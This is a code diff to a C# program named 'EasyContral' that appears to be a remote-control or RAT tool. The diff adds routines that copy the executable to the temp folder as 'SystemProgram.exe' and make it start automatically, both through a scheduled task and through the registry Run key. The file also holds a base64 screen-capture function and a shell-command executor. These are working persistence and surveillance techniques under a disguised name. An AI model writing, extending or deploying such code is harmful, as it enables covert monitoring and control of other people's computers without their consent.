@@ -1,15 +1,12 @@
-﻿using Newtonsoft.Json;
+﻿using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Text;
-using System.Threading;
+using System.Reflection;
 using System.Windows.Forms;
 
 namespace EasyContral
@@ -21,22 +18,28 @@ namespace EasyContral
         {
             return CaptureScreenToBase64();
         }
-        static string CaptureScreenToBase64()
+        public static void AutoRun_TaskScheduler()
         {
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            string currentPath = Assembly.GetExecutingAssembly().Location;
+            string tempPath = Path.Combine(Path.GetTempPath(), "SystemProgram.exe");
+            File.Copy(currentPath, tempPath, true);
+            using (TaskService ts = new TaskService())
             {
-                using (Graphics g = Graphics.FromImage(bitmap))
-                {
-                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-                }
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    bitmap.Save(ms, ImageFormat.Png);
-                    byte[] imageBytes = ms.ToArray();
-                    return Convert.ToBase64String(imageBytes);
-                }
+                TaskDefinition td = ts.NewTask();
+                td.RegistrationInfo.Description = "SystemProgram";
+                td.Principal.LogonType = TaskLogonType.InteractiveToken;
+                td.Actions.Add(new ExecAction(tempPath, null, null));
+                ts.RootFolder.RegisterTaskDefinition("SystemProgram", td);
             }
+        }
+        public static void AutoRun_Registry()
+        {
+            string currentPath = Assembly.GetExecutingAssembly().Location;
+            string tempPath = Path.Combine(Path.GetTempPath(), "SystemProgram.exe");
+            File.Copy(currentPath, tempPath, true);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("SystemProgram", tempPath);
+            key.Close();
         }
         public static string Shell(string command)
         {
@@ -94,6 +97,23 @@ namespace EasyContral
                 Processs.Add(processId.ToString(), Dicprocess);
             }
             return Processs;
+        }
+        static string CaptureScreenToBase64()
+        {
+            Rectangle bounds = Screen.GetBounds(Point.Empty);
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    bitmap.Save(ms, ImageFormat.Png);
+                    byte[] imageBytes = ms.ToArray();
+                    return Convert.ToBase64String(imageBytes);
+                }
+            }
         }
     }
 }
